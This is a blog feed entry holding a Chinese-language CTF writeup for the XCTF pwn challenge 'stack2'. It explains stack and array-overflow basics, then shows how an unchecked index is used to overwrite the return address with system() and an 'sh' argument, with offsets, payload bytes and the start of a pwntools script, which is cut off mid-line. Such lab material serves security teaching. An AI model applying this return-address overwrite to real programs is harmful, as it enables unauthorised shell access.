<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-06-08T15:13:15.300Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【XCTF-pwn】stack2 writeup</title>
    <link href="https://muzibing.github.io/2020/06/08/2020.06.08%EF%BC%88123%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/08/2020.06.08（123）/</id>
    <published>2020-06-07T16:00:00.000Z</published>
    <updated>2020-06-08T15:13:15.300Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-相关知识点"><a href="#0x00-相关知识点" class="headerlink" title="0x00.相关知识点"></a><font color="navy"><code>0x00.相关知识点</code></font></h3><h4 id="1-retn-指令"><a href="#1-retn-指令" class="headerlink" title="1.retn 指令"></a><font color="blue"><code>1.retn 指令</code></font></h4><p><code>格式</code>：retn</p><p><code>功能</code>：返回主程序。经常和<code>call</code>一起使用，当调用的过程结束后实现从过程返回至原调用程序的下一条指令，本指令不影响标志位</p><p><code>说明</code>：由于在过程定义时，已指明其近(NEAR)或远(FAR)的属性,所以RET指令根据段内调用与段间调用,执行不同的操作  </p><ul><li><code>对段内调用</code>：返回时，由堆栈弹出一个字的返回地址的段内偏移量至IP</li><li><code>对段外调用</code>：返回时，由堆栈弹出的第一个字为返回地址的段内偏移量，将其送入IP中，由堆栈弹出第二个字为返回地址的段基址，将其送入CS中</li></ul><p><code>举例</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面用一个简单的代码来说明一下retn的具体作用，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This_is_a_function.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        s = fun();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"s is %d\n"</span>,s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main和fun函数的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">000011a9 &lt;fun&gt;:</span><br><span class="line">   0x565561a9 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x565561aa &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x565561ac &lt;+3&gt;:     push   ebx</span><br><span class="line">   0x565561ad &lt;+4&gt;:     sub    esp,0x4</span><br><span class="line">   0x565561b0 &lt;+7&gt;:     call   0x56556221 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0x565561b5 &lt;+12&gt;:    add    eax,0x2e4b</span><br><span class="line">   0x565561ba &lt;+17&gt;:    sub    esp,0xc</span><br><span class="line">   0x565561bd &lt;+20&gt;:    lea    edx,[eax-0x1ff8]</span><br><span class="line">   0x565561c3 &lt;+26&gt;:    push   edx</span><br><span class="line">   0x565561c4 &lt;+27&gt;:    mov    ebx,eax</span><br><span class="line">   0x565561c6 &lt;+29&gt;:    call   0x56556040 &lt;puts@plt&gt;</span><br><span class="line">   0x565561cb &lt;+34&gt;:    add    esp,0x10</span><br><span class="line">   0x565561ce &lt;+37&gt;:    mov    eax,0x0</span><br><span class="line">   0x565561d3 &lt;+42&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x565561d6 &lt;+45&gt;:    leave  </span><br><span class="line">   0x565561d7 &lt;+46&gt;:    ret</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">000011d8 &lt;main&gt;:</span><br><span class="line">   0x565561d8 &lt;+0&gt;:     lea    ecx,[esp+0x4]   </span><br><span class="line">   0x565561dc &lt;+4&gt;:     and    esp,0xfffffff0                                                               </span><br><span class="line">   0x565561df &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]                                                           </span><br><span class="line">   0x565561e2 &lt;+10&gt;:    push   ebp                                                                           </span><br><span class="line">   0x565561e3 &lt;+11&gt;:    mov    ebp,esp                                                                       </span><br><span class="line">   0x565561e5 &lt;+13&gt;:    push   ebx                                                                           </span><br><span class="line">   0x565561e6 &lt;+14&gt;:    push   ecx                                                                           </span><br><span class="line">   0x565561e7 &lt;+15&gt;:    sub    esp,0x10                                                                     </span><br><span class="line">   0x565561ea &lt;+18&gt;:    call   0x565560b0 &lt;__x86.get_pc_thunk.bx&gt;                                           </span><br><span class="line">   0x565561ef &lt;+23&gt;:    add    ebx,0x2e11                                                                   </span><br><span class="line">   0x565561f5 &lt;+29&gt;:    call   0x565561a9 &lt;fun&gt;                                                             </span><br><span class="line">   0x565561fa &lt;+34&gt;:    mov    DWORD PTR [ebp-0xc],eax                                                       </span><br><span class="line">   0x565561fd &lt;+37&gt;:    sub    esp,0x8                                                                       </span><br><span class="line">   0x56556200 &lt;+40&gt;:    push   DWORD PTR [ebp-0xc]                                                           </span><br><span class="line">   0x56556203 &lt;+43&gt;:    lea    eax,[ebx-0x1fe4]                                                                0x56556209 &lt;+49&gt;:    push   eax                                                                              0x5655620a &lt;+50&gt;:    call   0x56556030 &lt;printf@plt&gt;                                                       </span><br><span class="line">   0x5655620f &lt;+55&gt;:    add    esp,0x10                                                                     </span><br><span class="line">   0x56556212 &lt;+58&gt;:    mov    eax,0x0                                                                       </span><br><span class="line">   0x56556217 &lt;+63&gt;:    lea    esp,[ebp-0x8]                                                                 </span><br><span class="line">   0x5655621a &lt;+66&gt;:    pop    ecx                                                                           </span><br><span class="line">   0x5655621b &lt;+67&gt;:    pop    ebx</span><br><span class="line">   0x5655621c &lt;+68&gt;:    pop    ebp</span><br><span class="line">   0x5655621d &lt;+69&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x56556220 &lt;+72&gt;:    ret</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;观察main函数中调用fun函数时栈中的变化，如图所示：</p><p><img src="/images/123-1.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上图中可以看出，在进入fun函数之后，main+34偏移处的地址<code>0x565561fa</code>被放在了栈中，这也就是我们所说的返回地址，我们将断点打到<code>0x565561d6</code>处，也就是fun函数中的leave指令的地方，我们观察寄存器和栈中的情况。由于leave指令相当于<code>movl %ebp %esp; popl %ebp</code>，具体的如下图：</p><p><img src="/images/123-2.jpg" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也就是说，<strong>在执行到 <code>ret</code> 语句的时候，寄存器<code>eip</code>指向函数的返回地址，</strong>知道这一点就可以了</p><h4 id="2-数组溢出原理"><a href="#2-数组溢出原理" class="headerlink" title="2.数组溢出原理"></a><font color="blue"><code>2.数组溢出原理</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果没有检查数组的输入上界，那么很容易产生溢出，在C语言中，数组的元素下标是从0开始计算的，所以，对于n个元素的数组a[n]， 遍历它的时候是a[0],a[1],…,a[n-1]，如果遍历到a[n]，数组就溢出了。下面就用一个简单的例子进行说明，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">3</span>] = &#123;<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> a; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入数组索引下标："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输出数组元素：array[%d] = 0x%x\n"</span>, index, <span class="built_in">array</span>[index]); <span class="comment">//数组越界读操作</span></span><br><span class="line">    <span class="comment">//array[index] = 1 ; //数组越界写操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面用GDB进行调试，在执行第7行前，该程序的栈的示意图如下：</p><p><img src="/images/123-3.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过GDB的调试，我们可以发现数组寻址的方式为：<code>ebp+eax*4-0x18</code>，其中<code>0x18</code>是数组array首地址<code>ebp-0x18</code>得来的，<code>eax</code>也就是我们要输入的下标，这里之所以是<code>eax*4</code>，是因为数组array的值是int类型，4个字节大小。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正常来说，我们要想输出array中的<code>0x22</code>的话，就需要我们输入下标<code>1</code>，使得<code>ebp+eax*4-0x18=0xffffd8c8+1*4-0x18=0xffffd8b4</code>，那么如果没有对输入的下标进行限制的话，那么就很有可能发生数组溢出的问题，比如这里我们可以输入下标为<code>4</code>，那么该程序会将<code>0xffffd8c8+4*4-0x18=0xffffd8c0</code>地址处的值<code>0xffffd8e0</code>打印出来，如下图所示：</p><p><img src="/images/123-4.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以上就是数组溢出的一个原理了，在有的程序中，我们可以利用输入数组的值来达到改变<code>eip</code>的效果，本题就是一个很好的例子。</p><h4 id="3-字符类型在数组中存放的形式（字符和字符字面值）"><a href="#3-字符类型在数组中存放的形式（字符和字符字面值）" class="headerlink" title="3.字符类型在数组中存放的形式（字符和字符字面值）"></a><font color="blue"><code>3.字符类型在数组中存放的形式（字符和字符字面值）</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先来问一个问题：<code>计算机为什么用二进制和十六进制</code>？<sup>[2]</sup></p><blockquote><p>因为二值信号可以很容易地被表示、存储和传输。例如，可以表示为穿孔卡片上有洞或无洞、导线上的高电压或低电压，或者顺时针或逆时针的磁场。而由于用二进制表示法太冗长，而十进制表示法与位模式的互相转换很麻烦，替代的方法是以16为基数，即十六进制（hexadecimal）。</p></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再来问一个问题：<code>什么是字符字面值？</code><sup>[2]</sup></p><blockquote><p>字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、’b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结如下：</p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">5</span>]=<span class="string">"abcd"</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="string">'c'</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>]==<span class="number">0x61</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a[0] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">0</span>],a[<span class="number">0</span>],a[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a[1] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">1</span>],a[<span class="number">1</span>],a[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   b == %c(char) == %d(int) == 0x%x(hex)\n"</span>,b,b,b);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"!="</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输出的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a[0] == a(char) == 97(int) == 0x61(hex)</span><br><span class="line">a[1] == b(char) == 98(int) == 0x62(hex)</span><br><span class="line">   b == c(char) == 99(int) == 0x63(hex)</span><br><span class="line">Press any key to continue</span><br></pre></td></tr></table></figure><blockquote><p>从上面的代码运行结果中可以看出，对于char类型输入0x62，这个值被当作字符面值相当于给a[1]输入了字符’b’，在内存中以二进制<code>01100010</code>的形式进行存储着</p></blockquote><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file stack </span><br><span class="line">stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec stack </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/stack2/stack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>开启了栈不可执行和金丝雀保护，也就是说我们无法使用栈溢出。使用IDA打开该文件，得到它的伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@18</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [bp-90h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-8Ch]@6</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+20h] [bp-88h]@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [sp+24h] [bp-84h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+28h] [bp-80h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+2Ch] [bp-7Ch]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [sp+30h] [bp-78h]@13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [sp+34h] [bp-74h]@20</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [sp+38h] [bp-70h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [sp+9Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v14 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j), j) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>仔细观察上述伪代码，可以发现在选择更改新的值的时候，没有对数组上界进行限制，产生了数组溢出漏洞；又在IDA中发现<code>hackhere</code>函数，里面调用了<code>system(&quot;/bin/bash&quot;)</code>函数，这里参考<a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">官方的writeup</a>，指出：<code>这个题有个坑点在于题目给出了getshell的函数，但是出题人在搭建docker环境时未注意，环境中只给了sh，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到getshell，需要简单的ROP一下。</code>下面来确定v13与返回地址的偏移位置，v13是EBP-0x70,但是EIP却不是EBP+4,至于为什么, 有博主说这是因为开了Canary保护,需要动态调试计算这个偏移,下面来动态调试计算这个偏移。<sup>[1]</sup></p></blockquote><p><img src="/images/123-5.png" alt></p><blockquote><p>从上图可以看出该调试过程中的<code>main</code>函数ebp的地址为<code>0xffffd8d8</code>，而retn指令对应栈顶的地址为<code>0xffffd8ec</code>，也就是说返回地址的位置在<code>0xffffd8ec</code>，那么算下来两者之间差了<code>0xffffd8ec-0xffffd8d8=0x14</code>，这是因为开启了Canary的原因，正来说两者之间的差距应该为<code>0x4</code>，那么此时栈中的情况如下示意图：</p></blockquote><p><img src="/images/123-6.png" alt></p><blockquote><p>上图中包含了很多信息，主要有：</p><ul><li>返回地址相对于v13的偏移：<code>0x84</code></li><li>解释了为什么是<code>ebp+eax*1-0x70</code>：因为v13是一个char类型的字符数组，每一个值占一个空间</li></ul><p>那么下面我们来看看看怎么使得返回地址为system的地址，如下图：</p></blockquote><p><img src="/images/123-7.png" alt></p><blockquote><p>同样上图也包含了很多信息：</p><ul><li>因为是小端存储的方式，而system函数的地址为<code>0x08048450</code>，所以连续存储了<code>0x50</code>、<code>0x84</code>、<code>0x04</code>、<code>0x08</code></li><li>要明白得到<code>0x08048450</code>的结果是图中所示求得的，那么两种方式是否有联系呢？以后再探讨</li></ul></blockquote><p><img src="/images/123-8.png" alt></p><blockquote><p>通过gdb调试，我们可以看到返回地址已经成为了system函数地址，那么下面我们需要找到system函数的参数位置，其中栈的情况如下，</p></blockquote><p><img src="/images/123-10.png" alt></p><blockquote><p>从上图得知sh要写入的偏移是v13到返回地址的偏移再加上8<sup>[4]</sup>，我们进行gdb调试，看看是否能成功写入：</p></blockquote><p><img src="/images/123-9.png" alt></p><blockquote><p>从上图中可以看出我们已经成功地将system和sh的地址写入到我们想写入的地方</p></blockquote><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote><p>根据上文的分析，我们找到system、sh的地址和v13相对于返回地址的偏移：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br></pre></td></tr></table></figure><blockquote><p>这道题目前面几步的选择无关紧要，所以我们可以直接写出这部分的脚本：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span 